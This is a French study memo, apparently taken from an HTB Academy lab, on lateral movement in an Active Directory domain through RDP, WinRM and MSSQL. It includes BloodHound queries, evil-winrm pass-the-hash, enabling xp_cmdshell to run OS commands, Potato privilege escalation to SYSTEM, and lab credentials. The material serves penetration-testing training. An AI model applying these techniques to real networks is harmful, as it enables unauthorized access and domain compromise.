# Mémo — Privileged Access (RDP / WinRM / MSSQL)

> Après le foothold : avancer latéralement/verticalement vers d'autres hosts (→ compromission domaine).
> Si on a **local admin** sur un host → **Pass-the-Hash** via SMB. Sinon, 3 autres voies de déplacement ci-dessous.
> Domaine : `INLANEFREIGHT.LOCAL`. Host Windows : MS01. Host Linux d'attaque : `172.16.5.225` (`htb-student:HTB_@cademy_stdnt!`).

---

## 1. Les 3 voies d'accès distant + edges BloodHound

| Accès | Protocole | Edge BloodHound |
|-------|-----------|-----------------|
| **RDP** | Remote Desktop (GUI) | `CanRDP` |
| **WinRM / PSRemoting** | Windows Remote Management (CLI PowerShell) | `CanPSRemote` |
| **MSSQL** | compte `sysadmin` sur une instance SQL → requêtes + OS commands | `SQLAdmin` |

> 💡 Premier réflexe après import BloodHound : **le groupe Domain Users a-t-il un droit d'admin local ou d'exécution (RDP/WinRM) sur un ou plusieurs hosts ?** (jackpot sur les jump/RDS hosts).

---

## 2. RDP

Groupe à viser : **Remote Desktop Users**.
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
# Si MemberName = INLANEFREIGHT\Domain Users (IsGroup:True) → TOUT le domaine peut RDP
```
- Fréquent sur **RDS / jump hosts** → pillage de données/creds, ou escalade locale → account takeover.
- BloodHound : Node Info → *Execution Rights*, ou requêtes *Find Workstations/Servers where Domain Users can RDP*.
- Connexion : `xfreerdp` / Remmina (Linux), `mstsc.exe` (Windows).

---

## 3. WinRM (PSRemoting)

Groupe à viser : **Remote Management Users** (existe depuis Win8/Server 2012, donne WinRM **sans** local admin).
```powershell
Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"
```
Cypher BloodHound (coller dans Raw Query) :
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2
```

### Depuis Windows — Enter-PSSession
```powershell
$password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred
```

### Depuis Linux — evil-winrm
```bash
gem install evil-winrm                    # install
evil-winrm -i 10.129.201.234 -u forend    # -p PASS, ou -H NTHASH (pass-the-hash), -S (ssl)
```
> Port WinRM par défaut : **5985** (HTTP) / 5986 (HTTPS). `-H` permet le **pass-the-hash**.

---

## 4. MSSQL (SQLAdmin)

Accès obtenu souvent via **Kerberoasting** (service accounts), LLMNR, password spraying, ou **Snaffler** (web.config / connection strings).
Cypher BloodHound :
```cypher
MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2
```
> Exemple du module : `damundsen` a **SQLAdmin** sur `ACADEMY-EA-DB01`. On utilise notre chaîne ACL (`wley` → reset mdp `damundsen` = `SQL1234!`) pour s'authentifier.

### Depuis Windows — PowerUpSQL
```powershell
cd .\PowerUpSQL\ ; Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain                              # trouver les instances (SPN MSSQLSvc)
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'
```

### Depuis Linux — mssqlclient.py (Impacket)
```bash
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth
# Password: SQL1234!
```
Shell SQL → commandes utiles :
```
help                       # liste des commandes
enable_xp_cmdshell         # active xp_cmdshell
xp_cmdshell whoami /priv   # exécute une commande OS
```

### Escalade via MSSQL
`xp_cmdshell whoami /priv` → si **SeImpersonatePrivilege** est *Enabled* → **JuicyPotato / PrintSpoofer / RoguePotato** = SYSTEM.
(Détaillé dans le module *Windows Privilege Escalation*, sections SeImpersonate / SeAssignPrimaryToken.)

---

## 5. À retenir

| Accès | Enum | Connexion Windows | Connexion Linux |
|-------|------|-------------------|-----------------|
| **RDP** | `Get-NetLocalGroupMember ... "Remote Desktop Users"` / edge `CanRDP` | `mstsc.exe` | `xfreerdp` / Remmina |
| **WinRM** | `... "Remote Management Users"` / edge `CanPSRemote` | `Enter-PSSession` | `evil-winrm` (`-H` = PtH) |
| **MSSQL** | edge `SQLAdmin` / `Get-SQLInstanceDomain` | PowerUpSQL `Get-SQLQuery` | `mssqlclient.py -windows-auth` |

| Point clé | Détail |
|-----------|--------|
| Local admin | → **Pass-the-Hash** via SMB |
| Remote Management Users | WinRM **sans** local admin |
| xp_cmdshell | exécuter des commandes OS depuis MSSQL |
| SeImpersonatePrivilege | → Potato → **SYSTEM** |
| Réflexe BloodHound | Domain Users ont-ils admin/RDP/WinRM quelque part ? |
